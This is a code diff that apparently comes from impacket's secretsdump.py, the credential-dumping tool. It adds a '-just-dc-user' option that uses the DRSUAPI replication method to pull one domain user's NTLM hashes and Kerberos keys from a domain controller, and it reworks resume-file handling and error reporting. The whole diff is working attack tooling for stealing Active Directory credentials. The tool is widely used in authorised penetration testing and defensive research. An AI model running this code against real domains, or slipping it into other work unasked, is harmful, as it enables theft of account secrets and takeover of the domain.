@@ -58,6 +58,7 @@ import string
 import codecs
 import os
 
+from impacket import system_errors
 from impacket.examples import logger
 from impacket import version, winregistry, ntlm
 from impacket.smbconnection import SMBConnection
@@ -1364,7 +1365,7 @@ class NTDSHashes:
         )
 
     def __init__(self, ntdsFile, bootKey, isRemote=False, history=False, noLMHash=True, remoteOps=None,
-                 useVSSMethod=False, justNTLM=False, pwdLastSet=False, resumeSession=None, outputFileName=None):
+                 useVSSMethod=False, justNTLM=False, pwdLastSet=False, resumeSession=None, outputFileName=None, justUser=None):
         self.__bootKey = bootKey
         self.__NTDS = ntdsFile
         self.__history = history
@@ -1384,6 +1385,7 @@ class NTDSHashes:
         self.__savedSessionFile = resumeSession
         self.__resumeSessionFile = None
         self.__outputFileName = outputFileName
+        self.__justUser = justUser
 
     def getResumeSessionFile(self):
         return self.__resumeSessionFile
@@ -1568,7 +1570,7 @@ class NTDSHashes:
             if keysFile is not None:
                 keysFile.flush()
 
-    def __decryptHash(self, record, rid=None, prefixTable=None, outputFile=None):
+    def __decryptHash(self, record, prefixTable=None, outputFile=None):
         if self.__useVSSMethod is True:
             logging.debug('Decrypting hash for user: %s' % record[self.NAME_TO_INTERNAL['name']])
 
@@ -1655,6 +1657,9 @@ class NTDSHashes:
             if self.__history:
                 LMHistory = []
                 NTHistory = []
+
+            rid = unpack('<L', record['pmsgOut']['V6']['pObjects']['Entinf']['pName']['Sid'][-4:])[0]
+
             for attr in record['pmsgOut']['V6']['pObjects']['Entinf']['AttrBlock']['pAttr']:
                 try:
                     attId = drsuapi.OidFromAttid(prefixTable, attr['attrTyp'])
@@ -1860,72 +1865,107 @@ class NTDSHashes:
                 logging.info('Resuming from SID %s, be patient' % resumeSid)
                 # The resume session file is the same as the savedSessionFile
                 tmpName = self.__savedSessionFile
+                resumeFile = open(tmpName, 'wb+')
             else:
                 resumeSid = None
-                tmpName = 'sessionresume_%s' % ''.join([random.choice(string.letters) for i in range(8)])
-                logging.debug('Session resume file will be %s' % tmpName)
-                # Creating the resume session file
-                try:
-                    resumeFile = open(tmpName, 'wb+')
-                    self.__resumeSessionFile = tmpName
-                except Exception, e:
-                    raise Exception('Cannot create resume session file %s' % str(e))
-
-            while status == STATUS_MORE_ENTRIES:
-                resp = self.__remoteOps.getDomainUsers(enumerationContext)
-
-                for user in resp['Buffer']['Buffer']:
-                    userName = user['Name']
-
-                    userSid = self.__remoteOps.ridToSid(user['RelativeId'])
-                    if resumeSid is not None:
-                        # Means we're looking for a SID before start processing back again
-                        if resumeSid == userSid.formatCanonical():
-                            # Match!, next round we will back processing
-                            resumeSid = None
-                        continue
-
-                    # Let's crack the user sid into DS_FQDN_1779_NAME
-                    # In theory I shouldn't need to crack the sid. Instead
-                    # I could use it when calling DRSGetNCChanges inside the DSNAME parameter.
-                    # For some reason tho, I get ERROR_DS_DRA_BAD_DN when doing so.
-                    crackedName = self.__remoteOps.DRSCrackNames(drsuapi.DS_NAME_FORMAT.DS_SID_OR_SID_HISTORY_NAME, drsuapi.DS_NAME_FORMAT.DS_FQDN_1779_NAME, name = userSid.formatCanonical())
-
-                    if crackedName['pmsgOut']['V1']['pResult']['cItems'] == 1:
-                        userRecord = self.__remoteOps.DRSGetNCChanges(crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['pName'][:-1])
-                        #userRecord.dump()
-                        if userRecord['pmsgOut']['V6']['cNumObjects'] == 0:
-                            raise Exception('DRSGetNCChanges didn\'t return any object!')
-                    else:
-                        logging.warning('DRSCrackNames returned %d items for user %s, skipping' %(crackedName['pmsgOut']['V1']['pResult']['cItems'], userName))
+                # We do not create a resume file when asking for a single user
+                if self.__justUser is None:
+                    tmpName = 'sessionresume_%s' % ''.join([random.choice(string.letters) for i in range(8)])
+                    logging.debug('Session resume file will be %s' % tmpName)
+                    # Creating the resume session file
                     try:
-                        self.__decryptHash(userRecord, user['RelativeId'],
-                                           userRecord['pmsgOut']['V6']['PrefixTableSrc']['pPrefixEntry'],
-                                           hashesOutputFile)
-                        if self.__justNTLM is False:
-                            self.__decryptSupplementalInfo(userRecord, userRecord['pmsgOut']['V6']['PrefixTableSrc'][
-                                'pPrefixEntry'], keysOutputFile, clearTextOutputFile)
-
+                        resumeFile = open(tmpName, 'wb+')
+                        self.__resumeSessionFile = tmpName
                     except Exception, e:
-                        #import traceback
-                        #traceback.print_exc()
-                        logging.error("Error while processing user!")
-                        logging.error(str(e))
+                        raise Exception('Cannot create resume session file %s' % str(e))
 
-                    # Saving the session state
-                    resumeFile.seek(0,0)
-                    resumeFile.truncate(0)
-                    resumeFile.write(userSid.formatCanonical())
-                    resumeFile.flush()
+            if self.__justUser is not None:
+                crackedName = self.__remoteOps.DRSCrackNames(drsuapi.DS_NT4_ACCOUNT_NAME_SANS_DOMAIN, drsuapi.DS_NAME_FORMAT.DS_FQDN_1779_NAME, name = self.__justUser)
 
-                enumerationContext = resp['EnumerationContext']
-                status = resp['ErrorCode']
+                if crackedName['pmsgOut']['V1']['pResult']['cItems'] == 1:
+                    if crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status'] !=0:
+                        logging.error("%s: %s" % system_errors.ERROR_MESSAGES[0x2114+crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status']])
+                        return
+
+                    userRecord = self.__remoteOps.DRSGetNCChanges(crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['pName'][:-1])
+                    #userRecord.dump()
+                    if userRecord['pmsgOut']['V6']['cNumObjects'] == 0:
+                        raise Exception('DRSGetNCChanges didn\'t return any object!')
+                else:
+                    logging.warning('DRSCrackNames returned %d items for user %s, skipping' %(crackedName['pmsgOut']['V1']['pResult']['cItems'], self.__justUser))
+                try:
+                    self.__decryptHash(userRecord,
+                                       userRecord['pmsgOut']['V6']['PrefixTableSrc']['pPrefixEntry'],
+                                       hashesOutputFile)
+                    if self.__justNTLM is False:
+                        self.__decryptSupplementalInfo(userRecord, userRecord['pmsgOut']['V6']['PrefixTableSrc'][
+                            'pPrefixEntry'], keysOutputFile, clearTextOutputFile)
+
+                except Exception, e:
+                    #import traceback
+                    #traceback.print_exc()
+                    logging.error("Error while processing user!")
+                    logging.error(str(e))
+            else:
+                while status == STATUS_MORE_ENTRIES:
+                    resp = self.__remoteOps.getDomainUsers(enumerationContext)
+
+                    for user in resp['Buffer']['Buffer']:
+                        userName = user['Name']
+
+                        userSid = self.__remoteOps.ridToSid(user['RelativeId'])
+                        if resumeSid is not None:
+                            # Means we're looking for a SID before start processing back again
+                            if resumeSid == userSid.formatCanonical():
+                                # Match!, next round we will back processing
+                                resumeSid = None
+                            continue
+
+                        # Let's crack the user sid into DS_FQDN_1779_NAME
+                        # In theory I shouldn't need to crack the sid. Instead
+                        # I could use it when calling DRSGetNCChanges inside the DSNAME parameter.
+                        # For some reason tho, I get ERROR_DS_DRA_BAD_DN when doing so.
+                        crackedName = self.__remoteOps.DRSCrackNames(drsuapi.DS_NAME_FORMAT.DS_SID_OR_SID_HISTORY_NAME, drsuapi.DS_NAME_FORMAT.DS_FQDN_1779_NAME, name = userSid.formatCanonical())
+
+                        if crackedName['pmsgOut']['V1']['pResult']['cItems'] == 1:
+                            if crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status'] !=0:
+                                logging.error("%s: %s" % system_errors.ERROR_MESSAGES[0x2114+crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status']])
+                                break
+                            userRecord = self.__remoteOps.DRSGetNCChanges(crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['pName'][:-1])
+                            #userRecord.dump()
+                            if userRecord['pmsgOut']['V6']['cNumObjects'] == 0:
+                                raise Exception('DRSGetNCChanges didn\'t return any object!')
+                        else:
+                            logging.warning('DRSCrackNames returned %d items for user %s, skipping' %(crackedName['pmsgOut']['V1']['pResult']['cItems'], userName))
+                        try:
+                            self.__decryptHash(userRecord,
+                                               userRecord['pmsgOut']['V6']['PrefixTableSrc']['pPrefixEntry'],
+                                               hashesOutputFile)
+                            if self.__justNTLM is False:
+                                self.__decryptSupplementalInfo(userRecord, userRecord['pmsgOut']['V6']['PrefixTableSrc'][
+                                    'pPrefixEntry'], keysOutputFile, clearTextOutputFile)
+
+                        except Exception, e:
+                            #import traceback
+                            #traceback.print_exc()
+                            logging.error("Error while processing user!")
+                            logging.error(str(e))
+
+                        # Saving the session state
+                        resumeFile.seek(0,0)
+                        resumeFile.truncate(0)
+                        resumeFile.write(userSid.formatCanonical())
+                        resumeFile.flush()
+
+                    enumerationContext = resp['EnumerationContext']
+                    status = resp['ErrorCode']
 
             # Everything went well and we covered all the users
-            # Let's remove the resume file
-            resumeFile.close()
-            os.remove(tmpName)
-            self.__resumeSessionFile = None
+            # Let's remove the resume file is we had created it
+            if self.__justUser is None:
+                resumeFile.close()
+                os.remove(tmpName)
+                self.__resumeSessionFile = None
 
         # Now we'll print the Kerberos keys. So we don't mix things up in the output.
         if len(self.__kerberosKeys) > 0:
@@ -1993,6 +2033,7 @@ class DumpSecrets:
         self.__doKerberos = options.k
         self.__justDC = options.just_dc
         self.__justDCNTLM = options.just_dc_ntlm
+        self.__justUser = options.just_dc_user
         self.__pwdLastSet = options.pwd_last_set
         self.__resumeFileName = options.resumefile
 
@@ -2118,7 +2159,7 @@ class DumpSecrets:
                                            noLMHash=self.__noLMHash, remoteOps=self.__remoteOps,
                                            useVSSMethod=self.__useVSSMethod, justNTLM=self.__justDCNTLM,
                                            pwdLastSet=self.__pwdLastSet, resumeSession=self.__resumeFileName,
-                                           outputFileName=self.__outputFileName)
+                                           outputFileName=self.__outputFileName, justUser=self.__justUser)
             try:
                 self.__NTDSHashes.dump()
             except Exception, e:
@@ -2191,6 +2232,8 @@ if __name__ == '__main__':
     parser.add_argument('-use-vss', action='store_true', default=False,
                         help='Use the VSS method insead of default DRSUAPI')
     group = parser.add_argument_group('display options')
+    group.add_argument('-just-dc-user', action='store', metavar='USERNAME',
+                       help='Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. Implies also -just-dc switch')
     group.add_argument('-just-dc', action='store_true', default=False,
                         help='Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)')
     group.add_argument('-just-dc-ntlm', action='store_true', default=False,
@@ -2226,12 +2269,26 @@ if __name__ == '__main__':
         password = password + '@' + address.rpartition('@')[0]
         address = address.rpartition('@')[2]
 
+    if options.just_dc_user is not None:
+        if options.use_vss is True:
+            logging.error('-just-dc-user switch is not supported in VSS mode')
+            sys.exit(1)
+        elif options.resumefile is not None:
+            logging.error('resuming a previous NTDS.DIT dump session not compatible with -just-dc-user switch')
+            sys.exit(1)
+        elif address.upper() == 'LOCAL' and username == '':
+            logging.error('-just-dc-user not compatible in LOCAL mode')
+            sys.exit(1)
+        else:
+            # Having this switch on implies not asking for anything else.
+            options.just_dc = True
+
     if options.use_vss is True and options.resumefile is not None:
         logging.error('resuming a previous NTDS.DIT dump session is not supported in VSS mode')
         sys.exit(1)
 
     if address.upper() == 'LOCAL' and username == '' and options.resumefile is not None:
-        logging.error('resuming a previous NTDS.DIT dump session is not supported in VSS mode')
+        logging.error('resuming a previous NTDS.DIT dump session is not supported in LOCAL mode')
         sys.exit(1)
 
     if address.upper() == 'LOCAL' and username == '':
